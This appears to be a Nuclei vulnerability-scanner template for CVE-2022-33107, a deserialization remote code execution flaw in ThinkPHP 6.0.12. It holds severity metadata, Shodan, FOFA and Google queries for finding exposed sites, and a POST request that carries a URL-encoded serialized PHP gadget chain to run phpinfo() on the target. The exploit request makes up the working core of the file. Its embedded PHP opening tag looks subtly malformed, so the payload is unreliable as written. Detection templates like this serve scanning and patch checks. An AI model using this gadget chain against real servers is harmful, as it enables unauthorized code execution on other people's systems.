id: CVE-2022-33107

info:
  name: ThinkPHP 6.0.12 Unserialize RCE
  author: ProjectDiscoveryAI
  severity: critical
  description: ThinkPHP v6.0.12 was discovered to contain a deserialization vulnerability via the component vendor\league\flysystem-cached-adapter\src\Storage\AbstractCache.php. This vulnerability allows attackers to execute arbitrary code via a crafted payload.
  impact: |
    Successful exploitation could allow remote attackers to execute arbitrary code on the target system.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version of ThinkPHP.
  reference:
    - https://github.com/top-think/framework/issues/2717
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-33107
    cwe-id: CWE-502
    epss-score: 0.00201
    epss-percentile: 0.58869
    cpe: cpe:2.3:a:thinkphp:thinkphp:6.0.12:*:*:*:*:*:*:*
  metadata:
    vendor: thinkphp
    product: thinkphp
    shodan-query: title:"Thinkphp"
    fofa-query: header="think_lang"
    google-query: intitle:"thinkphp"

http:
  - method: POST
    path:
      - "{{BaseURL}}"

    body: |
      cmd=O%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00lazySave%22%3Bb%3A1%3Bs%3A12%3A%22%00%00withEvent%22%3Bb%3A0%3Bs%3A15%3A%22%00%00table%22%3Bs%3A4%3A%22a%3A%22%3Bs%3A2%3A%22domain%22%3Bs%3A27%3A%22%3C%3Cphp+phpinfo%28%29%3B+exit%28%29%3B+%3E%22%3Bs%3A6%3A%22%00%00app%22%3Bs%3A16%3A%22think%5CMiddleware%22%3Bs%3A20%3A%22%00%00route%22%3Bs%3A21%3A%22think%5Cconsole%5COutput%22%3B%7D

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "phpinfo"
        part: body
